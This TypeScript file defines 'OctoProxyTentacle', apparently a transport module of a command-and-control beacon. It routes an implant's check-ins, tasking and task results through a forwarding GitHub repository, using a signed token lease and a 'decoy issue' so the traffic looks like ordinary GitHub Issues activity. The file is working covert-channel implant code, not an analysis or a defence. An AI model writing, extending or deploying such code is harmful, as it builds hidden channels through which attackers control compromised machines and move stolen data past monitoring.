/**
 * OctoProxyTentacle (Tentacle 10)
 *
 * Delegation wrapper that routes all sync traffic through a forwarding
 * GitHub repository instead of the main repo.
 *
 * The proxy substitutes only repository coordinates and a signed,
 * repository-bound token lease. The inner Issues tentacle performs all
 * GitHub API operations.
 */

import type {
  BeaconConfig,
  CheckinPayload,
  ITentacle,
  ProxyConfig,
  ResultSubmissionOutcome,
  Task,
  TaskResult,
} from "../types.ts";
import { IssuesTentacle } from "./IssuesTentacle.ts";

export class OctoProxyTentacle implements ITentacle {
  readonly kind = "proxy" as const;

  /** Config used by the inner tentacle after proxy substitution. */
  readonly innerConfig: BeaconConfig;

  /** Inner class name exposed for diagnostics and tests. */
  readonly innerKindName: string;

  private readonly inner: ITentacle;

  constructor(config: BeaconConfig, proxyConfig: ProxyConfig) {
    if (!proxyConfig.githubTokenLease) {
      throw new Error(
        `Proxy ${proxyConfig.owner}/${proxyConfig.repo} requires a signed, repository-bound token lease`,
      );
    }
    if (proxyConfig.innerKind !== "issues") {
      throw new Error("OctoProxy supports only the Issues relay transport");
    }
    if (
      !Number.isSafeInteger(proxyConfig.decoyIssue) ||
      proxyConfig.decoyIssue <= 0
    ) {
      throw new Error("OctoProxy requires a positive provisioned decoy issue");
    }
    const { state: _primaryState, ...baseConfig } = config;
    this.innerConfig = {
      ...baseConfig,
      repo: { owner: proxyConfig.owner, name: proxyConfig.repo },
      token: proxyConfig.githubTokenLease.token,
      githubTokenLease: proxyConfig.githubTokenLease,
      issuesStateScope:
        `proxy:${proxyConfig.owner.toLowerCase()}/${proxyConfig.repo.toLowerCase()}`,
      issuesIssueNumber: proxyConfig.decoyIssue,
      issuesRequireOperatorKeyMatch: true,
      // A proxy registration traverses four queued Actions jobs. Keep the
      // direct Issues default short while allowing ordinary runner latency.
      issuesRegistrationAckTimeoutMs: 120_000,
    };

    this.innerKindName = "IssuesTentacle";
    this.inner = this.createInner(this.innerConfig);
  }

  /** Overridable in tests to inject a mock inner transport. */
  protected createInner(
    config: BeaconConfig,
  ): ITentacle {
    return new IssuesTentacle(config);
  }

  isAvailable(): Promise<boolean> {
    return this.inner.isAvailable();
  }

  checkin(payload: CheckinPayload): Promise<Task[]> {
    return this.inner.checkin(payload);
  }

  async submitResult(result: TaskResult): Promise<ResultSubmissionOutcome> {
    const outcome = await this.inner.submitResult(result);
    return {
      ...outcome,
      channel: "proxy",
    };
  }

  async teardown(): Promise<void> {
    // Proxy issues and comments are durable transport artifacts. Normal
    // shutdown and recovery rebuilds must not delete or close them before a
    // delayed reply has been observed.
    await this.inner.teardown();
  }
}
